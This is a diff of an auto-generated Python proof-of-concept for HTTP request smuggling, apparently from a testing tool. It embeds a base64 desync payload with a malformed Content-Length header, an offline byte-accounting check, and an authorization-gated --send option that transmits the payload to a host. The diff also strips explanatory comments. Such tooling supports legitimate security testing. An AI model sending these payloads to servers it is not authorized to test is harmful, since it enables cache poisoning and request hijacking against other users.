@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """请求走私（HTTP/1.1 消息边界分歧）
 
-由 CED 自动生成 —— 用例 b8f75cf9，场景 desync。
+由 CED 自动生成 —— 用例 b8f75cf9，场景 desync，领域 http1-framing。
 零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。
 
-    python poc_b8f75cf9.py                      # 离线：算清字节归属（默认，不联网）
-    python poc_b8f75cf9.py --send 127.0.0.1:8080 --i-am-authorized
+    python poc_b8f75cf9.py                      # 离线：算清量化指标（默认，不联网）
+    python poc_b8f75cf9.py --send HOST:PORT --i-am-authorized
                                             # 真的把最小复现样本发出去（仅限已授权目标）
 
 合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。
@@ -32,8 +32,8 @@ ROOT = _find_root()
 if str(ROOT) not in sys.path:
     sys.path.insert(0, str(ROOT))
 
-from ced.impls import reference                      # noqa: E402
-from ced.orchestrate.chain import chain_evidence     # noqa: E402
+from ced.impls import reference
+from ced.orchestrate.chain import chain_evidence
 
 CASE_ID = 'b8f75cf9'
 FRONT = 'ref-cl-first'
@@ -42,8 +42,8 @@ PAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0K
 EXPECT = (0, 0, 0)
 
 
-def accounting() -> tuple[int, int, int] | None:
-    """用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。"""
+def measure():
+    """按两侧的策略算出量化指标。算不出来返回 None。"""
     try:
         front_policy = reference.policy_of(FRONT)
         back_policy = reference.policy_of(BACK)
@@ -65,20 +65,18 @@ def main() -> int:
     print(f"链路        {FRONT} → {BACK}")
     print(f"样本长度    {len(PAYLOAD)} 字节")
 
-    got = accounting()
+    got = measure()
+    ok = got is not None
     if got is None:
-        print("字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现")
+        print("量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现")
     else:
         forwarded, consumed, smuggled = got
         print(f"前置转发    {forwarded} 字节")
         print(f"后端消费    {consumed} 字节")
         print(f"被夹带      {smuggled} 字节")
         if EXPECT[0] is not None:
-            ok = got == EXPECT
+            ok = got == tuple(EXPECT)
             print(f"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）")
-            if not ok:
-                print("说明        期望值来自生成时的实现；不一致说明复现条件已变，")
-                print("            请重新跑一次 scan 生成新的 PoC，而不是改期望值。")
 
     if args.send:
         if not args.i_am_authorized:
@@ -96,9 +94,7 @@ def main() -> int:
                     break
                 response += chunk
         print(f"已发送      {args.send}，收到 {len(response)} 字节响应")
-        print("提示        走私的效果要看**下一条请求**，单次发送看不到；"
-              "请在后端日志或探针视角里确认被夹带的字节。")
-    return 0
+    return 0 if ok else 1
 
 
 if __name__ == "__main__":
